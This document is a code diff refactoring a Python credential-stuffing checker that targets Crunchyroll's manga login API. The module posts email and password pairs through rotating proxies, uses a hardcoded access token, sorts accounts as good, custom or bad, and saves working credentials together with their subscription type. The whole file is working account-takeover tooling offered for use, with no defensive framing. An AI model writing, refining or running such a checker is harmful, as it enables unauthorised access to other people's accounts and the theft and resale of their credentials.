@@ -1,11 +1,13 @@
-from __main__ import checker
+from modules.variables import Checker
 from requests import post
 from modules.functions import log,save,set_proxy,bad_proxy
 
 def check(email:str,password:str):
     retries = 0
-    while retries != checker.retries:
+    while retries != Checker.retries:
         proxy = set_proxy()
+        proxy_set = set_proxy(proxy)
+
         header = {
             "Host": "api-manga.crunchyroll.com" ,
             "Content-Type": "application/x-www-form-urlencoded" ,
@@ -17,31 +19,31 @@ def check(email:str,password:str):
         }
         data = f"access_token=dcIhv87VpKsqLCZ&account={email}&api_ver=1.0&device_id=123-456-789&device_type=com.crunchyroll.manga.ipad&duration=6000&format=json&password={password}"
         try:
-            r = post("https://api-manga.crunchyroll.com/cr_login",headers=header,data=data,proxies=set_proxy(proxy),timeout=checker.timeout)
+            r = post("https://api-manga.crunchyroll.com/cr_login",headers=header,data=data,proxies=proxy_set,timeout=Checker.timeout)
             if "Incorrect login information" in r.text:
                 retries += 1
             elif "\"premium\":\"\"" in r.text:
-                if not checker.cui:
+                if not Checker.cui:
                     log("custom",email+":"+password,"Crunchyroll")
-                save("Crunchyroll","custom",checker.time,email+":"+password)
-                checker.custom += 1
-                checker.cpm += 1
+                save("Crunchyroll","custom",Checker.time,email+":"+password)
+                Checker.custom += 1
+                Checker.cpm += 1
                 return
             elif "\"user_id\"" in r.text:
                 subscription = r.json()["data"]["user"]["access_type"]
-                if not checker.cui:
+                if not Checker.cui:
                     log("good",email+":"+password,"Crunchyroll")
-                save("Crunchyroll","good",checker.time,email+":"+password+f" | Subscription: {subscription}")
-                checker.good += 1
-                checker.cpm += 1
+                save("Crunchyroll","good",Checker.time,email+":"+password+f" | Subscription: {subscription}")
+                Checker.good += 1
+                Checker.cpm += 1
                 return
             else:
                 raise
         except:
             bad_proxy(proxy)
-            checker.errors += 1
-    if not checker.cui:
+            Checker.errors += 1
+    if not Checker.cui:
         log("bad",email+":"+password,"Crunchyroll")
-    checker.bad += 1
-    checker.cpm += 1
+    Checker.bad += 1
+    Checker.cpm += 1
     return
